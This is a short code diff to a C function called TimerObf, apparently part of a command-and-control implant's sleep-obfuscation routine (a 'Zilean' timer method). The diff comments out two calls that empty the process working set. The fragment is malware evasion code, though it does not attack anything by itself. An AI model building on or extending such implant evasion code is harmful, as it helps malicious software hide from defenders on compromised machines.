@@ -712,7 +712,7 @@ BOOL TimerObf(
     } else if ( Method == SLEEPOBF_ZILEAN ) {
         NtStatus = Instance.Win32.NtCreateEvent( &EvntWait, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE );
     }
-    Instance.Win32.K32EmptyWorkingSet((HANDLE)-1);
+    //Instance.Win32.K32EmptyWorkingSet((HANDLE)-1);
     if ( NT_SUCCESS( NtStatus ) )
     {
         /* create events */
@@ -957,7 +957,7 @@ BOOL TimerObf(
 
 
 LEAVE: /* cleanup */
-    Instance.Win32.K32EmptyWorkingSet((HANDLE)-1);
+    //Instance.Win32.K32EmptyWorkingSet((HANDLE)-1);
     if ( Queue ) {
         Instance.Win32.RtlDeleteTimerQueue( Queue );
         Queue = NULL;
